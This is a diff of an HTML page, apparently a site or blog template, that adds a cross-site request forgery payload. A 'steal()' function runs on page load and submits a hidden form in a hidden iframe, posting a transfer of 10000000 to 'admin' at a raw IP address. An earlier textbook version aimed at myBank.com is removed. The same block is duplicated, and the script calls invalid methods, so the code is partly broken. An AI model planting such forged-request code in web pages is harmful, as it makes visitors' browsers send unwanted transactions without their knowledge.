@@ -27,7 +27,13 @@
   
   
 <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
-
+　　　　<script type="text/javascript">
+　　　　　　function steal()
+　　　　　　{
+          　　　　 iframe = document.frames["steal"];
+　　     　　      iframe.document.Submit("transfer");
+　　　　　　}
+　　　　</script>
   
   
 
@@ -36,29 +42,32 @@
 </head>
 
 </html>
-<html>
-　　<head>
-　　　　<script type="text/javascript">
-　　　　　　function steal()
-　　　　　　{
-          　　　　 iframe = document.frames["steal"];
-　　     　　      iframe.document.Submit("transfer");
-　　　　　　}
-　　　　</script>
-　　</head>
+
 
 　　<body onload="steal()">
 　　　　<iframe name="steal" display="none">
-　　　　　　<form method="POST" name="transfer"　action="http://www.myBank.com/Transfer.php">
-　　　　　　　　<input type="hidden" name="toBankId" value="11">
-　　　　　　　　<input type="hidden" name="money" value="1000">
+　　　　　　<form method="POST" name="transfer"　action="http://173.82.206.142:8005/transfer.php">
+　　　　　　　　<input type="hidden" name="target" value="admin">
+　　　　　　　　<input type="hidden" name="money" value="10000000">
+				<input type="hidden" name="messages" value="1000">
 　　　　　　</form>
 　　　　</iframe>
 　　</body>
 </html>
 
 
-<body>
+
+
+	
+<body onload="steal()">
+　　　　<iframe name="steal" display="none">
+　　　　　　<form method="POST" name="transfer"　action="http://173.82.206.142:8005/transfer.php">
+　　　　　　　　<input type="hidden" name="target" value="admin">
+　　　　　　　　<input type="hidden" name="money" value="10000000">
+				<input type="hidden" name="messages" value="1000">
+　　　　　　</form>
+　　　　</iframe>
+
   <div id="app">
     
       <canvas class="fireworks"></canvas>
